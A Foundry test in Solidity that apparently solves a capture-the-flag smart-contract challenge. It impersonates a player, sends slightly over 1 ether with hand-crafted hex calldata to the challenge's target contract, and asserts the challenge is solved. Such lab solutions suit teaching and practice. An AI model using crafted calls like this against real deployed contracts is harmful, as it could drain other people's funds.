// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {Challenge} from "./challenge/Challenge.sol";

contract ExploitTest is Test {
    address playerAddr = makeAddr("player");
    Challenge challenge;

    function setUp() public {
        vm.deal(playerAddr, 2 ether);
        challenge = new Challenge{value: 25 ether}();
    }

    function test() public {
        vm.startPrank(playerAddr, playerAddr);

        address targetAddr = challenge.target();
        targetAddr.call{value: 0x0de0b6b3a7640001}(
            hex"2f4849470000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000002066757a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a7a6c616e64"
        );
        console2.log(targetAddr.balance);

        vm.stopPrank();

        assertTrue(challenge.isSolved());
    }
}
